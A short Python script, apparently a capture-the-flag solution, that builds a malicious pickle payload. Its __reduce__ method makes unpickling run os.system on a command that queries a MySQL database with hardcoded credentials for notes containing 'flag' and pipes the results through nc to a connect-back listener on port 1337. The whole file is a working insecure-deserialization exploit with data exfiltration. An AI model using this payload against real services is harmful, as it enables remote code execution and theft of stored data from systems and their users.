import pickle
import os

python_exploit = "import mysql.connector; conn = mysql.connector.connect(host='localhost', user='dbuser', password='123456', database='users'); cursor = conn.cursor(); cursor.execute('SELECT content FROM notes WHERE content LIKE \\'%flag%\\''); print([x for x in cursor.fetchall()])"

connect_back_listener = "127.0.0.1"
connect_back_port = 1337

class Exploit:
    def __reduce__(self):
        return (os.system, ("""python -c "{}"|nc {} {}""".format(python_exploit, connect_back_listener, connect_back_port),))

print(pickle.dumps(Exploit()))
